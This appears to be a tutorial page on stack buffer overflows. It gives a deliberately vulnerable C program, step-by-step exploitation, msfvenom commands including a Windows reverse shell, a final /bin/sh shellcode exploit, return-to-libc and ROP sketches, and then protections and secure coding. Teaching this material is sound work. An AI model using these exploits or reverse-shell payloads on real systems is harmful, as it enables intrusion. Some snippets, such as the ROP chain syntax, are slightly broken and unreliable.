---
title: Buffer Overflow
description: Understanding and exploiting buffer overflow vulnerabilities
---

## What is Buffer Overflow?

A buffer overflow occurs when data written to a buffer exceeds its allocated memory, overwriting adjacent memory locations. This can lead to crashes, code execution, or privilege escalation.

## Types of Buffer Overflows

### Stack-Based Overflow
- Most common type
- Overwrites stack memory
- Can control return address
- Exploits function calls

### Heap-Based Overflow
- Overwrites heap memory
- More complex to exploit
- Use-after-free vulnerabilities

### Integer Overflow
- Arithmetic operation exceeds max value
- Can lead to buffer overflow
- Example: `int + int = negative`

## Stack Anatomy

```
High Address
+------------------+
| Command Line Args|
+------------------+
| Environment Vars |
+------------------+
|     Stack        |  ← Grows downward
|       ↓          |
+------------------+
|                  |
+------------------+
|       ↑          |
|      Heap        |  ← Grows upward
+------------------+
|   BSS Segment    |
+------------------+
|   Data Segment   |
+------------------+
|   Text Segment   |
+------------------+
Low Address
```

### Stack Frame
```
+------------------+  ← Higher Address
|  Function Args   |
+------------------+
|  Return Address  |  ← EIP (Instruction Pointer)
+------------------+
|   Saved EBP      |  ← EBP (Base Pointer)
+------------------+
|  Local Variables |
+------------------+
|     Buffer       |
+------------------+  ← ESP (Stack Pointer)
Lower Address
```

## Vulnerable Code Example

### C Code
```c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking!
    printf("Buffer: %s\n", buffer);
}

int main(int argc, char **argv) {
    if (argc > 1) {
        vulnerable_function(argv[1]);
    }
    return 0;
}
```

### Compilation
```bash
# Compile without protections (for learning)
gcc -o vuln vuln.c -fno-stack-protector -z execstack -no-pie

# Run normally
./vuln "Hello"

# Crash with overflow
./vuln $(python3 -c "print('A'*100)")
```

## Exploitation Steps

### 1. Find Vulnerability
```bash
# Fuzzing
for i in {1..100}; do
    echo "Testing with $i bytes"
    ./vuln $(python3 -c "print('A'*$i)")
done
```

### 2. Determine Offset
```bash
# Generate unique pattern
msf-pattern_create -l 200

# Find offset where EIP is overwritten
msf-pattern_offset -q 41304141  # Example address
```

### 3. Control EIP
```python
#!/usr/bin/env python3
# Proof of concept

offset = 76  # Offset to EIP
eip = b"BBBB"  # Overwrite with "BBBB"
padding = b"A" * offset

payload = padding + eip
print(payload.decode('latin-1'))
```

### 4. Find Return Address
```bash
# Find JMP ESP or similar gadget
msf-nasm_shell
nasm > jmp esp
00000000  FFE4              jmp esp

# Search for FFE4 in binary
objdump -d vuln | grep "ff e4"
```

### 5. Create Shellcode
```bash
# Generate shellcode with msfvenom
msfvenom -p linux/x86/exec CMD="/bin/sh" -b '\x00' -f python

# Windows reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -b '\x00\x0a' -f python
```

### 6. Final Exploit
```python
#!/usr/bin/env python3

offset = 76
ret_addr = b"\x90\x91\x92\x93"  # Address of JMP ESP (little-endian)
nop_sled = b"\x90" * 16  # NOP sled

# Shellcode (example - execve /bin/sh)
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
    b"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
)

padding = b"A" * (offset - len(nop_sled) - len(shellcode))
payload = padding + shellcode + nop_sled + ret_addr

with open("exploit.txt", "wb") as f:
    f.write(payload)

print(f"Payload length: {len(payload)}")
```

## Protection Mechanisms

### ASLR (Address Space Layout Randomization)
```bash
# Check ASLR status
cat /proc/sys/kernel/randomize_va_space
# 0 = Disabled
# 1 = Partial
# 2 = Full

# Disable (for testing)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# Enable
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```

### Stack Canaries
```c
// Compiler adds canary value
void function() {
    unsigned long canary = STACK_CANARY;
    char buffer[64];
    // ... code ...
    if (canary != STACK_CANARY) {
        abort();  // Stack smashing detected!
    }
}
```

### DEP/NX (Data Execution Prevention)
```bash
# Check if NX is enabled
readelf -l binary | grep GNU_STACK
# RWE = Executable stack (vulnerable)
# RW  = Non-executable (protected)

# Compile with NX
gcc -o safe safe.c -z noexecstack
```

### PIE (Position Independent Executable)
```bash
# Compile with PIE
gcc -o safe safe.c -fPIE -pie

# Check if PIE
readelf -h binary | grep Type
# EXEC = Not PIE
# DYN = PIE
```

## Bypassing Protections

### Return-to-libc
```python
# Instead of shellcode, call system()
system_addr = 0xb7e4c060  # Address of system()
exit_addr = 0xb7e3f4d0    # Address of exit()
bin_sh = 0xb7f6d3cc       # Address of "/bin/sh"

payload = padding + p32(system_addr) + p32(exit_addr) + p32(bin_sh)
```

### ROP (Return-Oriented Programming)
```python
# Chain together existing code snippets (gadgets)
pop_eax = 0x080484d0      # pop eax; ret
pop_ebx = 0x080484d1      # pop ebx; ret
int_0x80 = 0x080484d2     # int 0x80; ret

# Build ROP chain
rop_chain = p32(pop_eax) + p32(0xb) +  # sys_execve
            p32(pop_ebx) + p32(bin_sh_addr) + 
            p32(int_0x80)
```

## GDB Debugging

```bash
# Load binary
gdb ./vuln

# Set breakpoint
break vulnerable_function

# Run with input
run $(python3 -c "print('A'*100)")

# Examine stack
x/100x $esp

# Examine registers
info registers

# Step through
stepi  # Step instruction
nexti  # Next instruction

# Continue
continue
```

## Detection

### Compiler Warnings
```bash
gcc -Wall -Wextra -Werror vuln.c
# Warning: 'strcpy' is dangerous
```

### Static Analysis
```bash
# Flawfinder
flawfinder vuln.c

# Cppcheck
cppcheck vuln.c
```

### Runtime Detection
- Stack canaries trigger abort
- ASLR makes exploitation harder
- DEP/NX prevents shellcode execution

## Secure Coding Practices

### Safe Functions
```c
// Unsafe
strcpy(dest, src);
sprintf(buffer, "%s", input);
gets(buffer);

// Safe alternatives
strncpy(dest, src, sizeof(dest)-1);
snprintf(buffer, sizeof(buffer), "%s", input);
fgets(buffer, sizeof(buffer), stdin);
```

### Bounds Checking
```c
if (strlen(input) >= sizeof(buffer)) {
    fprintf(stderr, "Input too long\n");
    return;
}
```

### Modern Languages
- Python, Java, Rust: Memory-safe
- Automatic bounds checking
- No manual memory management

## Resources

- Smashing The Stack For Fun And Profit (Aleph One)
- The Shellcoder's Handbook
- Exploit Education: https://exploit.education
- ROPgadget: https://github.com/JonathanSalwan/ROPgadget
- pwntools: Python exploit development library
